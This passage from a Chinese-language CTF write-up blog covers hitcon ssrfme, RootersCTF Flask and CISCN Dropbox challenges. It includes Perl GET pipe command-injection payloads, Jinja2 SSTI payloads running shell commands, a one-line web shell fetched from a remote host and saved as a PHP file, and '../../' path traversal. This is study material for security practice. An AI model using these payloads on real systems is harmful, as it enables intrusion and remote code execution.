. <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>题目先获取ip地址，然后利用md5函数，创建路径并进入到路径下。</p><p>之后将得到的url参数执行shell_exec命令，再得到filename参数中的路径信息，并且对路径中的.进行替换为空，防止路径穿越。</p><p>创建filename中的路径，再到路径下，之后把data数据内容写入到basename（即filename参数中的文件）中</p><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p>basename — 返回路径中的文件名部分</p><p>escapeshellarg — 把字符串转义为可以在 shell 命令里使用的参数</p><p>将给字符串增加一个单引号并且能引用或者转义任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含<a href="https://www.php.net/manual/zh/function.exec.php">exec()</a>、<a href="https://www.php.net/manual/zh/function.system.php">system()</a> 和<a href="https://www.php.net/manual/zh/language.operators.execution.php">执行运算符</a> 。</p><p>shell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回</p><p>pathinfo()函数</p><p>pathinfo() 函数以数组的形式返回关于文件路径的信息。dirname是路径名，basename是文件全称。</p><p><img src="D:\My_Software\A_software\github_hexo\blog\themes\butterfly\source\img\博客图片\watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAU2sxeQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>GET命令执行漏洞</p><p>GET 如：GET google.com 返回整个HTML文件 详情 <a href="http://xahlee.info/perl/perl_get_url.html">http://xahlee.info/perl/perl_get_url.html</a></p><p>Perl里的Get函数漏洞，Get底层调用了open函数，open函数本身支持file协议 即可以file:打开文件。</p><blockquote><p>perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。</p></blockquote><p>即可以GET  file:cat &#x2F;flag|</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>首先查看根目录内容</p><p>?url&#x3D;&#x2F;&amp;filename&#x3D;a然后访问&#x2F;sandbox&#x2F;xxxxx&#x2F;a 可以看见根目录下有flag和readflag（这个一般是要执行）</p><p>?url&#x3D;xxx&amp;filename&#x3D;cat &#x2F;flag|</p><p>此时会访问url，然后将内容写入cat &#x2F;flag| 文件里面（此时访问&#x2F;sandbox&#x2F;xxxxx&#x2F;cat &#x2F;flag| 可以看见内容）</p><p>再url&#x3D;file:cat &#x2F;flag|&amp;filename&#x3D;123.txt</p><p>即利用file协议读取目标内容，配合漏洞，将结果写入123.txt</p><p>最后访问&#x2F;sandbox&#x2F;xxxxx&#x2F;123.txt 即可得到答案</p><p>或者open函数支持file协议； 可以利用<code>base -c &quot;cmd&quot;</code>进行命令执行</p><p>?url&#x3D;&amp;filename&#x3D;bash -c &#x2F;readflag|</p><p>再利用file协议查看</p><p>?url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;a<br>在访问&#x2F;sandbox&#x2F;xxxxxxxxxxxxxxxx&#x2F;a 得到flag</p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>由于可以将GET得到的内容写入文件，那么在服务器上放一句话木马，就可以写入xxx.php文件，而后直接链接。</p><p>payload：?filename&#x3D;ma.php&amp;url&#x3D;xxx&#x2F;xxx.txt </p><p>而后直接访问&#x2F;sandbox&#x2F;xxxxxxxxxxxxxxxx&#x2F;ma.php</p><p>(注意坑：只有写入功能，所以要是文件名没改会多次写入，可能就写错了导致执行不了木马了)</p><p>参考</p><p><a href="https://blog.csdn.net/RABCDXB/article/details/122491499">https://blog.csdn.net/RABCDXB/article/details/122491499</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105868449">https://blog.csdn.net/qq_45521281/article/details/105868449</a></p><p>[(123条消息) 关于BMZCTF hitcon_2017_ssrfme的解法_永远是少年啊的博客-CSDN博客_<a href="https://blog.csdn.net/weixin_40228200/article/details/112481089">hitcon 2017]ssrfme</a></p><p><a href="https://blog.csdn.net/AAAAAAAAAAAA66/article/details/121972668">(123条消息) i春秋CTF ssrfme (peal函数中get命令漏洞)命令执行 详细题解＋原理 学习过程_AAAAAAAAAAAA66的博客-CSDN博客_ctf get 命令执行</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/111058832">https://blog.csdn.net/rfrder/article/details/111058832</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2023</title>
      <link href="/2023/02/13/hgame2023/"/>
      <url>/2023/02/13/hgame2023/</url>
      
        <content type="html"><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><p>根据官方wp来复现，顺便写下当时做的思路</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>js,</p><p>在联想浏览器和火狐第二种老是不行，在edge第二种可以。先打断点后操纵人物去对话，然后修改id，再运行，发现属性会增加</p><p>Become A Member</p><p>携带请求body不⼀定要指定POST的请求⽅式</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[RootersCTF2019]I_&lt;3_Flask</title>
      <link href="/2023/02/11/RootersCTF2019-I-3-Flask/"/>
      <url>/2023/02/11/RootersCTF2019-I-3-Flask/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开没什么信息点，得利用工具arjun查找参数。</p><p>网上搜索然后下载，kali运行，找到name参数。</p><p>查参数</p><p><img src="C:\Users\wen\AppData\Roaming\Typora\typora-user-images\image-20230211195533349.png" alt="image-20230211195533349"></p><p>测试?name&#x3D;49，回显7个7，是flask，没有过滤。</p><p>直接payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?name=&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_44657899/article/details/119726513">https://blog.csdn.net/qq_44657899/article/details/119726513</a></p><p><a href="https://blog.csdn.net/m0_62905261/article/details/125947743">https://blog.csdn.net/m0_62905261/article/details/125947743</a></p><p><a href="https://blog.csdn.net/fmyyy1/article/details/115715212">https://blog.csdn.net/fmyyy1/article/details/115715212</a></p><p><a href="https://blog.csdn.net/Mrs_H/article/details/121411149">https://blog.csdn.net/Mrs_H/article/details/121411149</a></p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/115081637">https://blog.csdn.net/Zero_Adam/article/details/115081637</a> 这个</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> flask </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox</title>
      <link href="/2023/02/11/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/"/>
      <url>/2023/02/11/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/</url>
      
        <content type="html"><![CDATA[<h3 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h3><p>登录页面，尝试注册，然后登录，发现可以上传文件但是限制图片GIF，先上传正常的，发现可以下载和删除。猜测任意文件下载。抓包改filename，试了发现</p><p>filename&#x3D;..&#x2F;..&#x2F;index.php读取源码（删除HTML部分）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一共可以下载upload.php, register.php, login.php, download.php, delete.php，class.php，一般先审计config.php、class.php或function.php这些。</p><p>审计，发现与数据库交互的语句都进行了参数绑定。所以SQL注入就很难了。</p><p>download.php中filename过滤了flag，那可以猜要读取文件名有flag</p><p>然后看到了一个__call 魔术方法，暗示要用phar。</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="phar"><a href="#phar" class="headerlink" 